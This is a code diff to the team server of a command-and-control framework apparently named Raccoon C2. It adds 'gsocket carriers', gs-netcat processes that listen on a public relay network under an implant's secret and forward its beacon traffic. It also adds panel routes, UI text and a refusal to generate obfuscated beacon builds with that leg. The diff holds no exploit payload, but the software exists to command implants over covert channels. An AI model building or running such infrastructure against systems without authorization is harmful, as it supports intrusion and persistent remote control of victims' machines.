@@ -47,6 +47,16 @@ from flask import Flask, request, jsonify, send_file, send_from_directory, Respo
 # all.
 from software.c2.listeners.errors import SupervisorError
 
+# The carrier supervisor's refusals, which this file turns into status
+# codes the same way. Imported from the module that raises them rather
+# than from a dedicated `errors.py`, unlike the line above: that split
+# exists because `listeners/registry.py` pulls in the DNS parser, the
+# QUIC reassembler and the hand-written SMB2 parser, and
+# `gsocket/carrier.py` pulls in nothing but the standard library and
+# `gsocket/config.py`. There is no parser here to keep out of this
+# process, so a second one-class module would be ceremony.
+from software.c2.gsocket.carrier import CarrierError
+
 # The operator shell's server-side logic: the claim and its ownership
 # record, the two tunnel tasks, and the bridge to the shell port. A module
 # of its own because none of it is web-facing, and because `_log_event`
@@ -460,7 +470,35 @@ def _beacon_gen_config(body: dict, protocols: dict, c2_url: str,
     `_beacon_config_block` and `_obfuscate_layer` were both hoisted out of
     those same two routes for the same reason. The tunnel block is one
     more fact that has to reach both.
+
+    Raises `ValueError` -- which both routes turn into a 400 carrying the
+    message -- when the request enables the gsocket leg. That is the one
+    leg a generated build can never run: it reaches the team server
+    through a `gs-netcat` child process, and a generated build is a
+    single file of obfuscated source with no binary beside it. Refused
+    here rather than dropped, because a build whose fifth leg is silently
+    dead is the failure this repository keeps paying for -- a channel
+    that looks configured and delivers nothing -- and the operator's next
+    move is a bug report about the leg rather than a second request
+    without it.
     """
+    # Only an *enabled* leg is refused. Every config in this repository
+    # carries `enabled: false`, generator requests included, and those
+    # have to keep being accepted unchanged.
+    #
+    # First thing in the function, before the tunnel block below mints a
+    # PSK: a refusal raised after that would leave a credential in the
+    # store that no artifact holds -- the same ordering the two routes
+    # keep their drop-list check in for.
+    if protocols.get("gsocket", {}).get("enabled"):
+        raise ValueError(
+            "the gsocket leg cannot be generated: it needs a gs-netcat "
+            "binary on disk beside the beacon, and a generated build is a "
+            "single file with no binary beside it. The leg is available on "
+            "the hardware implant, whose image carries gs-netcat -- enable "
+            "it there, under c2.fallback.gsocket, and generate this build "
+            "without it.")
+
     https_cfg = protocols.get("https", {})
     dns_cfg = protocols.get("dns", {})
     smb_cfg = protocols.get("smb", {})
@@ -1069,7 +1107,8 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
                server_config: Optional[dict] = None,
                operator_port: Optional[int] = None,
                listener_token: Optional[str] = None,
-               supervisor=None, tunnel_supervisor=None) -> Flask:
+               supervisor=None, tunnel_supervisor=None,
+               carrier_supervisor=None) -> Flask:
     app = Flask(__name__)
     static_dir = Path(__file__).parent / "static"
     _server_config = server_config or {}
@@ -1416,61 +1455,124 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         except Exception as e:
             _finish_run(run, f"[error: {e}]", "error")
 
-    # ── Listeners (the 📡 panel) ──
+    # ── Listeners and gsocket carriers (the 📡 panel) ──
+    #
+    # Two configuration blocks, one panel, and deliberately two
+    # supervisors behind it. A listener is a process that terminates a
+    # transport and POSTs ciphertext at its `relay_url`, and
+    # `listeners/registry.py` validates it on `bind_host`, `bind_port`
+    # and that URL. A carrier binds nothing and POSTs nothing: it is a
+    # `gs-netcat` that listens on the Global Socket Relay Network under
+    # one implant's secret and forwards what arrives into the beacon
+    # socket this server already serves. Every one of those validations
+    # would have to be special-cased away to make one fit there, and that
+    # module exists to refuse configurations that cannot work -- so the
+    # carrier has its own block and its own supervisor, the way the
+    # tunnel server does, and this route merges their rows.
+
+    _NOTHING_CONFIGURED = (
+        "no listeners are configured, and no gsocket carriers either. Add a "
+        "c2.listeners or a c2.gsocket_carrier block to raccoon.yaml and "
+        "restart the team server; everything in both ships disabled.")
+
+    def _panel_supervisors():
+        """Whichever of the two this deployment has, listeners first."""
+        return [sup for sup in (supervisor, carrier_supervisor)
+                if sup is not None]
 
     @app.route("/api/server/listeners", methods=["GET"])
     @require_auth
     def api_listeners():
-        """What listeners exist, what state they are in, and why.
+        """What listeners and carriers exist, what state they are in, and why.
+
+        One list, two row shapes. A listener's row reports the socket it
+        binds; a carrier's reports `socket: null` and the implant
+        identity it listens under, because it binds none.
 
         Operator socket only. The agent socket serves the beacon endpoint
         and the DNS tasking route and nothing else, so a beacon that asked
         for this gets the cover answer -- which matters more here than for
         most routes, because this one can start and stop processes.
         """
-        if supervisor is None:
+        present = _panel_supervisors()
+        if not present:
             return jsonify({
                 "listeners": [],
                 "managed": False,
-                "detail": ("no listeners are configured. Add a "
-                           "c2.listeners block to raccoon.yaml and restart "
-                           "the team server; all three ship disabled."),
+                "detail": _NOTHING_CONFIGURED,
             })
+        rows = []
+        for sup in present:
+            rows.extend(sup.status())
+        # Both supervisors are built from the same --no-manage-listeners
+        # flag, so they agree in every shipped deployment; `all` is here
+        # so that a future one in which they disagree errs toward saying
+        # the controls cannot be trusted rather than toward enabling
+        # buttons that would refuse. Each row carries its own
+        # `can_control` regardless, which is what the panel disables on.
+        managed = all(sup.managed for sup in present)
         return jsonify({
-            "listeners": supervisor.status(),
-            "managed": supervisor.managed,
-            "detail": "" if supervisor.managed else (
-                "this deployment does not manage listener processes"),
+            "listeners": rows,
+            "managed": managed,
+            "detail": "" if managed else (
+                "this deployment does not manage listener or carrier "
+                "processes"),
         })
 
     @app.route("/api/server/listeners/<name>/<action>", methods=["POST"])
     @require_auth
     def api_listener_action(name, action):
-        """Start or stop one listener, and nothing else.
+        """Start or stop one listener or carrier, and nothing else.
 
         Two verbs, matched exactly. Anything else is a 404 rather than
-        something that reaches the supervisor: this route is how a panel
+        something that reaches a supervisor: this route is how a panel
         button turns into a process, and the set of things it can do
         should be readable in one line.
+
+        The name decides which supervisor is asked. A name owned by
+        neither is a 404; a name owned by *both* is refused rather than
+        guessed at, because then there is no "whichever owns it" and the
+        button would act on something other than the row it sits on.
         """
         if action not in ("start", "stop"):
             return jsonify({"error": "the only actions are start and stop",
                             "refused": str(action)[:64]}), 404
-        if supervisor is None:
-            return jsonify({"error": "no listeners are configured"}), 409
+        present = _panel_supervisors()
+        if not present:
+            return jsonify({"error": _NOTHING_CONFIGURED}), 409
+        owners = [sup for sup in present if name in sup.specs]
+        if not owners:
+            # 404 rather than 409: the name is the thing that is wrong,
+            # and the panel tells "you typed it wrong" from "it is
+            # already running" by the status code.
+            return jsonify({
+                "error": "nothing called %r is configured; have %s"
+                         % (name, ", ".join(sorted(
+                             configured for sup in present
+                             for configured in sup.specs)) or "none")}), 404
+        if len(owners) > 1:
+            return jsonify({
+                "error": "both c2.listeners and c2.gsocket_carrier configure "
+                         "something called %r, so this button cannot say "
+                         "which of the two it would %s. Rename one of them "
+                         "and restart the team server: the panel shows a row "
+                         "for each, and a control that acts on whichever "
+                         "supervisor was asked first is one an operator "
+                         "cannot read off the screen in front of them"
+                         % (name, action)}), 409
+        owner = owners[0]
         try:
-            doer = supervisor.start if action == "start" else supervisor.stop
+            doer = owner.start if action == "start" else owner.stop
             return jsonify(doer(name))
-        except SupervisorError as exc:
+        except (SupervisorError, CarrierError) as exc:
+            # 409: the name is already known to be one this deployment
+            # configures, so every refusal left is about the state or
+            # about what the process could not do.
             reason = str(exc)
-            # 404 when the name is unknown, 409 when the name is fine and
-            # the state is not. The panel shows the reason either way, but
-            # a status code that distinguishes them lets it tell "you
-            # typed it wrong" from "it is already running".
-            status = 404 if "no listener called" in reason else 409
-            logger.info("Listener %s refused for %r: %s", action, name,
-                        reason)
-            return jsonify({"error": reason}), status
+            logger.info("%s %s refused for %r: %s",
+                        "Carrier" if owner is carrier_supervisor
+                        else "Listener", action, name, reason)
+            return jsonify({"error": reason}), 409
 
     # ── The tunnel (the 🔌 panel) ──
     #
@@ -3763,6 +3865,14 @@ _RESCUE_LEG_WORDS = {
     "auth_required": "wanted authentication",
     "bad_payload": "answered with something unreadable",
     "resolve_failed": "did not resolve (RCODE %d)",
+    # The two a leg that needs a helper process has and no socket does.
+    # Without them `_rescue_summary` renders both as "unknown" through the
+    # fallback below, which would lose the carrier leg's single most
+    # useful diagnostic: an implant that cannot reach anywhere and whose
+    # fifth leg is missing its `gs-netcat` is telling an operator exactly
+    # what to fix, and "GSOCKET: unknown" is telling them nothing.
+    "binary_missing": "has no gs-netcat binary",
+    "carrier_failed": "its gs-netcat did not come up",
 }
 
 
@@ -8399,7 +8509,12 @@ async function drawListeners(panel){
     + '<p style="font-size:12px;color:var(--dim);margin:0 0 10px">'
     + 'A listener is a separate process that terminates one transport and '
     + 'relays encrypted traffic to this server. None of them holds the '
-    + 'encryption key.</p>';
+    + 'encryption key.<br>'
+    + 'A gsocket carrier binds no port and holds no encryption key '
+    + 'either: it listens on the Global Socket Relay Network under one '
+    + 'implant&#39;s secret and forwards what arrives into this '
+    + 'server&#39;s beacon socket, so its row shows that implant&#39;s '
+    + 'identity where a listener shows a host and port.</p>';
 
   if(!data.listeners.length){
     html += '<p class="loot-empty">' + esc(data.detail || "No listeners configured.") + '</p>';
@@ -8418,10 +8533,21 @@ async function drawListeners(panel){
     const counters = Object.keys(entry.counters || {})
       .map(k => esc(k.replace(/_/g," ")) + " " + esc(String(entry.counters[k])))
       .join(" &middot; ");
+    // A carrier's row reports `socket: null` where a listener's reports
+    // the address it binds, and that is the field the two shapes are
+    // told apart by. A carrier binds nothing -- it listens on the relay
+    // network under one implant's secret -- so the place that shows a
+    // host and port shows that implant's identity instead. Without it,
+    // two carriers on this panel would differ only by name, and the name
+    // is the one thing an operator chose rather than configured.
+    const where = entry.socket === null
+      ? ' for implant ' + esc(String(entry.identity))
+        + ' &mdash; no socket of its own'
+      : ' on ' + esc(entry.bind_host) + ':' + esc(String(entry.bind_port));
     html += '<div class="loot-item">'
       + '<div><strong>' + esc(entry.name) + '</strong>'
       + ' <span style="color:var(--dim)">' + esc(entry.transport)
-      + ' on ' + esc(entry.bind_host) + ':' + esc(String(entry.bind_port))
+      + where
       + '</span></div>'
       + '<div style="font-size:12px">state <strong>' + esc(entry.state) + '</strong>'
       + (entry.pid ? ' pid ' + esc(String(entry.pid)) : '')
@@ -11762,6 +11888,67 @@ def _build_tunnel_supervisor(args, parser):
                             managed=not args.no_manage_listeners)
 
 
+def _build_carrier_supervisor(args, parser):
+    """A CarrierSupervisor for `c2.gsocket_carrier` in `--config`, or None.
+
+    Imported here rather than at the top of the file for the reason
+    `_build_supervisor` is, though less of it applies: `config`,
+    `secrets` and `supervisor` are deferred to a deployment that
+    actually configures a carrier, while `carrier.py` itself is already
+    loaded at module scope -- the import at the top of this file takes
+    `CarrierError` from it, so that a refusal can be turned into a
+    status code. That is cheap and deliberate: the module is standard
+    library plus `gsocket/config.py`, with none of the protocol code the
+    listeners' split exists to keep out of this process.
+
+    A block that cannot be run is fatal with the offending value named,
+    rather than a warning. This is also the only place anything calls
+    `load_carriers` on a real configuration file, which is what makes its
+    strictness a property of the running system: a `c2.gsocket_carrier`
+    entry holding a key nobody reads -- `local_port`, say, which is real
+    on the implant's side of the same feature and has no reader on this
+    one -- would otherwise look applied. And the symptom of a carrier
+    that was silently not configured is a beacon that never checks in,
+    which is indistinguishable from a wrong secret, a relay that is
+    unreachable and an implant that is simply off.
+
+    The secret store is opened here too, so that a store which another
+    user can read is refused at start-up rather than at the first start
+    an operator presses. Every secret in it is a dialable path to an
+    implant's carrier.
+    """
+    if not args.config:
+        return None
+
+    import yaml
+
+    from software.c2.gsocket.config import load_carriers
+    from software.c2.gsocket.secrets import SecretStore, secretstore_path
+    from software.c2.gsocket.supervisor import CarrierSupervisor
+
+    try:
+        with open(args.config) as handle:
+            config = yaml.safe_load(handle) or {}
+    except (OSError, yaml.YAMLError) as exc:
+        parser.error("could not read %s: %s" % (args.config, exc))
+    try:
+        specs = load_carriers(config)
+    except ValueError as exc:
+        parser.error("%s: %s" % (args.config, exc))
+    if not specs:
+        return None
+
+    path = secretstore_path(args.data_dir)
+    try:
+        store = SecretStore(path)
+    except (OSError, ValueError) as exc:
+        parser.error(
+            "%s configures %d gsocket carrier(s), and their secret store "
+            "%s cannot be used: %s" % (args.config, len(specs), path, exc))
+    return CarrierSupervisor(specs, store,
+                             managed=not args.no_manage_listeners)
+
+
 def main():
     parser = argparse.ArgumentParser(
         description="Raccoon C2 Team Server",
@@ -11798,17 +11985,19 @@ def main():
     )
     parser.add_argument(
         "--config",
-        help="raccoon.yaml to read c2.listeners and c2.tunnel_server from, "
-             "so the 📡 and 🔌 panels can list, start and stop them. "
-             "Without it both panels say that nothing is configured, which "
-             "is what every deployment before these features should see.")
+        help="raccoon.yaml to read c2.listeners, c2.tunnel_server and "
+             "c2.gsocket_carrier from, so the 📡 and 🔌 panels can list, "
+             "start and stop them. Without it both panels say that nothing "
+             "is configured, which is what every deployment before these "
+             "features should see.")
     parser.add_argument(
         "--no-manage-listeners", action="store_true",
-        help="List and report on listeners and the tunnel server but "
-             "refuse to start or stop them. For a team server that has no "
-             "business spawning processes -- in a container, where mounting "
-             "the Docker socket would hand the container its host. Both "
-             "panels then disable their controls and state the reason.")
+        help="List and report on listeners, gsocket carriers and the tunnel "
+             "server but refuse to start or stop them. For a team server "
+             "that has no business spawning processes -- in a container, "
+             "where mounting the Docker socket would hand the container its "
+             "host. Both panels then disable their controls and state the "
+             "reason.")
     args = parser.parse_args()
     # 0 would bind an ephemeral port that the socket policy never matches:
     # the GUI would be locked out, or beacons sent nowhere, with nothing said.
@@ -11876,11 +12065,13 @@ def main():
     }
     supervisor = _build_supervisor(args, parser)
     tunnel_supervisor = _build_tunnel_supervisor(args, parser)
+    carrier_supervisor = _build_carrier_supervisor(args, parser)
     app = create_app(crypto, operator_token, data_dir, server_config=srv_config,
                      operator_port=args.operator_port if split else None,
                      listener_token=os.environ.get("RACCOON_LISTENER_TOKEN"),
                      supervisor=supervisor,
-                     tunnel_supervisor=tunnel_supervisor)
+                     tunnel_supervisor=tunnel_supervisor,
+                     carrier_supervisor=carrier_supervisor)
 
     if not split:
         network = (f"  Listen:   {proto}://{args.host}:{args.port}"
@@ -11943,6 +12134,14 @@ def main():
         # operator would have no panel to stop it from.
         if tunnel_supervisor is not None:
             tunnel_supervisor.stop_all()
+        # The carriers are children too, and a `gs-netcat` left behind
+        # holds its implant's address on the relay network: the next
+        # start under that secret would be paired against the orphan, so
+        # an implant's check-ins would land on a process with nothing
+        # behind it. Stopped after the tunnel for no reason beyond
+        # reading order; they share no state.
+        if carrier_supervisor is not None:
+            carrier_supervisor.stop_all()
 
 
 def _is_loopback(host: str) -> bool:
